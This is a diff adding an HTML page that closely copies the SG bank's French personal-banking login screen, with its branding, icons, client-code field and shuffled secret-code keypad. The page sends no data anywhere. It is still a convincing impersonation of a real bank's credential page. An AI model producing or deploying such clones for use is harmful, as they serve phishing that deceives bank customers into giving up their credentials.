@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SG | Authentification Sécurisée</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
+
+    <link rel="icon" href="https://particuliers.sg.fr/images/logo-sg-seul.svg">
+
+    <style>
+        /* --- Styles globaux --- */
+        body {
+            font-family: 'Source Sans Pro', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- En-tête (Header) --- */
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            flex-wrap: wrap; /* Permet aux éléments de passer à la ligne sur mobile */
+        }
+
+        .main-header .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .main-header .logo img {
+            height: 35px;
+            margin-right: 15px;
+        }
+
+        .main-header .logo span {
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+            letter-spacing: 1px;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .header-actions .btn-secondary,
+        .header-actions .btn-primary {
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+        }
+
+        .header-actions .btn-secondary {
+            background: none;
+            border: 1px solid #ccc;
+            color: #555;
+        }
+
+        .header-actions .btn-secondary:hover,
+        .header-actions .btn-secondary:focus {
+            background-color: #f0f0f0;
+            border-color: #999;
+        }
+
+        .header-actions .btn-primary {
+            background-color: #b3001f;
+            color: #fff;
+            border: none;
+        }
+
+        .header-actions .btn-primary:hover,
+        .header-actions .btn-primary:focus {
+            background-color: #cc001f;
+        }
+
+        /* --- Contenu principal (Main) --- */
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .breadcrumb {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Conteneur pour la mise en page principale */
+        .main-layout {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 40px;
+            margin: 40px auto;
+            flex-wrap: wrap; /* Permet aux colonnes de s'empiler sur mobile */
+        }
+
+        /* Section du formulaire de connexion */
+        .login-form-wrapper {
+            max-width: 400px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-right: 40px;
+            border-right: 1px solid #ccc;
+        }
+
+        .login-help-section {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .login-help-section h3 {
+            font-size: 18px;
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .login-help-section ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .login-help-section li {
+            margin-bottom: 5px;
+        }
+
+        .login-help-section a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        .login-help-section a:hover,
+        .login-help-section a:focus {
+            text-decoration: underline;
+        }
+
+        .login-form-section form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 300px;
+            align-items: center;
+        }
+
+        .login-form-section label {
+            width: 100%;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-group .clear-input {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 1.2em;
+            color: #999;
+            background: none;
+            border: none;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            transform: scale(1.2);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #b3001f;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-submit:disabled {
+            background-color: #b3001f;
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-submit:hover:enabled {
+            background-color: #cc001f;
+        }
+
+        .btn-submit:focus {
+            outline: 2px solid #b3001f;
+            outline-offset: 2px;
+        }
+
+        /* --- Sections du bas (Other Spaces, Useful Links) --- */
+        .other-spaces, .useful-links {
+            margin-top: 30px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .other-spaces h2, .useful-links h2 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .other-spaces .space-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fff;
+            padding: 15px 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            text-decoration: none;
+            color: #333;
+            margin: 0 auto 10px auto;
+            transition: background-color 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            max-width: 450px;
+        }
+
+        .other-spaces .space-box:hover,
+        .other-spaces .space-box:focus {
+            background-color: #f8f8f8;
+            outline: 2px solid #b3001f;
+            outline-offset: 2px;
+        }
+
+        .other-spaces .space-box > div {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .other-spaces .space-box p {
+            margin: 0;
+            line-height: 1.2;
+        }
+
+        .other-spaces .space-box strong {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .links-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap; /* Permet aux blocs de passer à la ligne sur mobile */
+        }
+
+        .link-box {
+            display: flex;
+            gap: 15px;
+            padding: 10px;
+            flex: 1;
+            max-width: 350px;
+            min-width: 280px; /* Pour éviter que les blocs deviennent trop petits */
+        }
+
+        .link-box img {
+            width: 48px;
+            height: 48px;
+            flex-shrink: 0;
+        }
+
+        .link-box > div {
+            flex: 1;
+        }
+
+        .link-box p {
+            font-weight: bold;
+            margin: 0 0 5px 0;
+            font-size: 16px;
+        }
+
+        .link-box a {
+            display: block;
+            color: #333;
+            text-decoration: underline;
+            margin-top: 5px;
+            font-weight: 400;
+        }
+
+        .link-box a:hover,
+        .link-box a:focus {
+            color: #b3001f;
+        }
+
+        /* --- Pied de page (Footer) --- */
+        .main-footer {
+            margin-top: auto;
+            background-color: #f8f8f8;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .footer-main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #ccc;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .footer-links a, .footer-social a, .footer-sub a {
+            color: #333;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover,
+        .footer-links a:focus {
+            text-decoration: underline;
+            color: #b3001f;
+        }
+
+        .footer-social {
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-social a img {
+            height: 24px;
+            width: 24px;
+            filter: invert(1);
+            background-color: #333;
+            border-radius: 50%;
+        }
+
+        .footer-sub {
+            padding: 20px 10px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            font-size: 12px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-sub a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .footer-sub a:hover,
+        .footer-sub a:focus {
+            text-decoration: underline;
+            color: #b3001f;
+        }
+
+        /* --- Styles pour l'authentification (Pavé numérique) --- */
+        .auth-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .client-code-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            margin-bottom: 20px;
+            max-width: 300px;
+        }
+
+        .client-code-display {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-bottom: 2px solid black;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 1.2em;
+            letter-spacing: 5px;
+            background-color: transparent; /* S'assure que le fond n'est pas gris */
+        }
+
+        .checkmark-icon {
+            display: none;
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .checkmark-icon.show {
+            display: block;
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .num-pad-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
+            text-align: center;
+        }
+
+        .num-pad {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+
+        .num-pad-button {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f2f2f2;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .num-pad-button:hover,
+        .num-pad-button:focus {
+            background-color: #e8e8e8;
+            outline: none; /* L'outline par défaut est souvent moche */
+        }
+
+        .num-pad-empty-cell {
+            width: 100%;
+            height: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f2f2f2;
+            box-sizing: border-box;
+            opacity: 0.5;
+            cursor: default;
+        }
+
+        .secret-code-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 300px;
+            gap: 5px;
+        }
+
+        .secret-code-display {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.5em;
+            padding: 0;
+            letter-spacing: 5px;
+            text-align: center;
+            border: none;
+            width: 150px;
+            background-color: transparent;
+            color: #666;
+            box-sizing: content-box;
+            pointer-events: none; /* Empêche la sélection du texte */
+        }
+
+        .secret-code-display:focus {
+            outline: none;
+        }
+
+        .btn-effacer {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            color: #333;
+            font-size: 1.2em;
+            padding: 0;
+            line-height: 1;
+        }
+
+        .btn-effacer:hover,
+        .btn-effacer:focus {
+            color: #b3001f;
+        }
+
+        .keyboard-sound-link {
+            display: inline-block;
+            margin-top: 15px;
+            text-align: center;
+            color: #333;
+            text-decoration: underline;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        /* --- Médias queries pour la réactivité --- */
+
+        /* Styles pour les tablettes (768px et moins) */
+        @media screen and (max-width: 768px) {
+            .main-header {
+                padding: 15px 20px;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+
+            .main-content {
+                padding: 15px;
+            }
+
+            .main-layout {
+                flex-direction: column;
+                align-items: center;
+                gap: 30px;
+            }
+
+            .login-form-wrapper {
+                padding-right: 0;
+                border-right: none;
+                max-width: 100%;
+            }
+
+            .login-help-section {
+                padding-top: 20px;
+                border-top: 1px solid #ccc;
+                text-align: center;
+                max-width: 100%;
+            }
+
+            .links-container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .link-box {
+                max-width: 100%;
+                min-width: unset;
+            }
+        }
+
+        /* Styles pour les petits mobiles (480px et moins) */
+        @media screen and (max-width: 480px) {
+            .client-code-container,
+            .secret-code-wrapper {
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .client-code-display,
+            .secret-code-display {
+                font-size: 1.1em;
+                letter-spacing: 3px;
+                width: 100%;
+            }
+
+            .num-pad {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .num-pad-button,
+            .num-pad-empty-cell {
+                padding: 12px;
+                font-size: 1em;
+            }
+
+            .num-pad-container {
+                max-width: 100%;
+            }
+
+            .btn-submit {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="main-header">
+        <div class="logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQV5LKSDzNeLQ1zujcBysUqcV7KA_vEdcWlf8tfkuau78NmZxMKKbm_lh8JHCL64-km0g&usqp=CAU" alt="Logo SG">
+            <span>C'EST VOUS L'AVENIR</span>
+        </div>
+        <div class="header-actions">
+            <button class="btn-secondary">Aide et contacts</button>
+            <button class="btn-primary">Ouvrir un compte</button>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <p class="breadcrumb"><strong>Connexion à votre Espace Client Particuliers</strong></p>
+
+        <div class="main-layout">
+            <div class="login-form-wrapper" id="client-code-section">
+                <form action="#" method="post" class="auth-form" aria-labelledby="client-code-title">
+                    <h3 id="client-code-title">Saisissez votre code client</h3>
+                    <div class="input-group">
+                        <label for="client-code" class="sr-only">Code client</label>
+                        <input type="text" id="client-code" name="client_code" placeholder="••••••••" maxlength="8">
+                        <button type="button" class="clear-input" aria-label="Effacer le code client">×</button>
+                    </div>
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">se souvenir de moi</label>
+                    </div>
+                    <button type="button" class="btn-submit" id="client-code-submit" disabled>Valider</button>
+                </form>
+            </div>
+
+            <div class="login-form-wrapper" id="secret-code-section" style="display: none;">
+                <h3 class="form-title">Saisissez votre Code Secret</h3>
+                <form action="#" method="post" class="auth-form">
+                    <div class="client-code-container">
+                        <input type="text" class="client-code-display" id="client-code-display-value" value="" readonly>
+                        <svg id="checkmark-icon" class="checkmark-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                        </svg>
+                    </div>
+
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember-me-toggle">
+                        <label class="switch" for="remember-me-toggle">
+                            <span class="slider"></span>
+                        </label>
+                        <div class="remember-me-text">
+                            <p>Se souvenir de moi</p>
+                            <span class="info-icon" title="Ceci vous permettra de ne pas avoir à saisir votre code client lors de votre prochaine connexion sur cet appareil.">i</span>
+                        </div>
+                    </div>
+
+                    <div class="secret-code-wrapper">
+                        <label for="secret-code-display" class="sr-only">Code secret</label>
+                        <input type="text" id="secret-code-display" class="secret-code-display" value="------" readonly>
+                        <button type="button" class="btn-effacer" id="btn-effacer" aria-label="Effacer le dernier chiffre">X</button>
+                    </div>
+
+                    <div class="num-pad-container">
+                        <div class="num-pad" id="num-pad" role="group" aria-labelledby="form-title">
+                            </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="secret-code-submit" disabled>Valider</button>
+                    <a href="#" class="keyboard-sound-link">Activer le clavier sonore</a>
+                </form>
+            </div>
+
+            <div class="login-help-section">
+                <h3>Où trouver mon Code Client SG ?</h3>
+                <ul class="bullet-list">
+                    <li>Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.</li>
+                </ul>
+                <h3>Code Client ou Code Secret inconnus ?</h3>
+                <ul>
+                    <li><a href="#" class="arrow-link"><span>&gt;&gt;</span> Je souhaite obtenir mon Code Client</a></li>
+                    <li><a href="#" class="arrow-link"><span>&gt;&gt;</span> Je ne connais pas mon Code Secret</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="bottom-sections-container">
+            <div class="other-spaces">
+                <h2>Nos autres Espaces Client</h2>
+                <a href="#" class="space-box">
+                    <div>
+                        <svg class="space-box-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6c6c6c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <rect x="3" y="1" width="18" height="22" rx="2" ry="2"></rect>
+                            <path d="M10 7L14 7"></path>
+                            <path d="M10 11L14 11"></path>
+                            <path d="M10 15L14 15"></path>
+                            <path d="M10 19L14 19"></path>
+                        </svg>
+                        <div>
+                            <p><strong>Espace Client Professionnels</strong></p>
+                            <p>Progéliance Net</p>
+                        </div>
+                    </div>
+                    <span>&gt;</span>
+                </a>
+                <a href="#" class="space-box">
+                    <div>
+                        <svg class="space-box-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6c6c6c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <circle cx="12" cy="7" r="4"></circle>
+                            <path d="M12 11c-2.761 0-5 2.239-5 5v6h10v-6c0-2.761-2.239-5-5-5z"></path>
+                        </svg>
+                        <div>
+                            <p><strong>Espace Client Entreprises</strong></p>
+                            <p>Sogecash Net</p>
+                        </div>
+                    </div>
+                    <span>&gt;</span>
+                </a>
+            </div>
+
+            <div class="useful-links">
+                <h2>Liens utiles</h2>
+                <div class="links-container">
+                    <div class="link-box">
+                        <img class="link-box-icon" src="https://particuliers.sg.fr/static/Resources/icons/SGAvenirStyledCarteBloquee48.svg" alt="Carte bancaire">
+                        <div class="link-box-content">
+                            <p>Urgences carte bancaire</p>
+                            <a href="#">Faire opposition à votre carte bancaire</a>
+                            <a href="#">Verrouiller votre carte bancaire</a>
+                        </div>
+                    </div>
+                    <div class="link-box">
+                        <img class="link-box-icon" src="https://particuliers.sg.fr/static/Resources/icons/SGAvenirStyledBouclierSecurite48.svg" alt="Conseils sécurité">
+                        <div class="link-box-content">
+                            <p>Nos conseils sécurité</p>
+                            <a href="#">Découvrez le Pass sécurité</a>
+                            <a href="#">Guide des bonnes pratiques</a>
+                            <a href="#">Voir les menaces identifiées</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="main-footer">
+        <div class="footer-main">
+            <div class="footer-links">
+                <a href="#">Questions fréquentes</a>
+                <a href="#">Trouver une agence</a>
+                <a href="#">Autres sites SG</a>
+            </div>
+            <div class="footer-social">
+                <a href="#" aria-label="Facebook">
+                    <img src="https://placehold.co/24x24/333/fff?text=f" alt="Logo Facebook">
+                </a>
+                <a href="#" aria-label="Twitter">
+                    <img src="https://placehold.co/24x24/333/fff?text=t" alt="Logo Twitter">
+                </a>
+                <a href="#" aria-label="Instagram">
+                    <img src="https://placehold.co/24x24/333/fff?text=i" alt="Logo Instagram">
+                </a>
+            </div>
+        </div>
+        <div class="footer-sub">
+            <a href="#">Sécurité</a>
+            <a href="#">Nos engagements</a>
+            <a href="#">Gestion des Cookies</a>
+            <a href="#">Données personnelles</a>
+            <a href="#">Documentation et Tarifs</a>
+            <a href="#">Réaliser une prestation</a>
+            <a href="#">Contestation et réclamation</a>
+            <a href="#">Informations légales</a>
+            <a href="#">Accessibilité Numérique (partiellement conforme)</a>
+            <a href="#">Label - Engagé RSE</a>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const clientCodeInput = document.getElementById('client-code');
+            const clientCodeSubmitBtn = document.getElementById('client-code-submit');
+            const clearInputBtn = document.querySelector('.clear-input');
+
+            const clientCodeSection = document.getElementById('client-code-section');
+            const secretCodeSection = document.getElementById('secret-code-section');
+            const clientCodeDisplayValue = document.getElementById('client-code-display-value');
+            const checkmarkIcon = document.getElementById('checkmark-icon');
+
+            // Logique pour la première étape (code client)
+            clientCodeInput.addEventListener('input', () => {
+                clientCodeInput.value = clientCodeInput.value.replace(/[^0-9]/g, '');
+                clientCodeSubmitBtn.disabled = clientCodeInput.value.length !== 8;
+            });
+
+            clearInputBtn.addEventListener('click', () => {
+                clientCodeInput.value = '';
+                clientCodeSubmitBtn.disabled = true;
+                clientCodeInput.focus();
+            });
+
+            clientCodeSubmitBtn.addEventListener('click', () => {
+                if (clientCodeInput.value.length === 8) {
+                    clientCodeSection.style.display = 'none';
+                    secretCodeSection.style.display = 'flex';
+                    clientCodeDisplayValue.value = clientCodeInput.value;
+                    checkmarkIcon.classList.add('show');
+                    shuffleNumPad();
+                }
+            });
+
+            // Logique pour la deuxième étape (code secret)
+            const numPadContainer = document.getElementById('num-pad');
+            const secretCodeDisplay = document.getElementById('secret-code-display');
+            const effacerBtn = document.getElementById('btn-effacer');
+            const secretCodeSubmitBtn = document.getElementById('secret-code-submit');
+            const maxSecretCodeLength = 6;
+
+            let secretCode = '';
+
+            function shuffleNumPad() {
+                const numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
+                const shuffledNumbers = numbers.sort(() => 0.5 - Math.random());
+
+                // Vider le pavé numérique actuel
+                numPadContainer.innerHTML = '';
+
+                // Créer 16 cellules, dont 10 pour les chiffres et 6 vides
+                const cells = [];
+                for (let i = 0; i < 16; i++) {
+                    if (i < 10) {
+                        cells.push(`<button type="button" class="num-pad-button" data-value="${shuffledNumbers[i]}">${shuffledNumbers[i]}</button>`);
+                    } else {
+                        cells.push('<div class="num-pad-empty-cell"></div>');
+                    }
+                }
+
+                // Mélanger les cellules et les insérer
+                cells.sort(() => 0.5 - Math.random());
+                numPadContainer.innerHTML = cells.join('');
+            }
+
+            numPadContainer.addEventListener('click', (e) => {
+                const button = e.target.closest('.num-pad-button');
+                if (button && secretCode.length < maxSecretCodeLength) {
+                    const value = button.dataset.value;
+                    secretCode += value;
+                    updateSecretCodeDisplay();
+                }
+            });
+
+            effacerBtn.addEventListener('click', () => {
+                if (secretCode.length > 0) {
+                    secretCode = secretCode.slice(0, -1);
+                    updateSecretCodeDisplay();
+                }
+            });
+
+            function updateSecretCodeDisplay() {
+                let displayValue = '';
+                for (let i = 0; i < maxSecretCodeLength; i++) {
+                    displayValue += i < secretCode.length ? '*' : '-';
+                }
+                secretCodeDisplay.value = displayValue;
+                secretCodeSubmitBtn.disabled = secretCode.length !== maxSecretCodeLength;
+            }
+        });
+    </script>
+</body>
+</html>
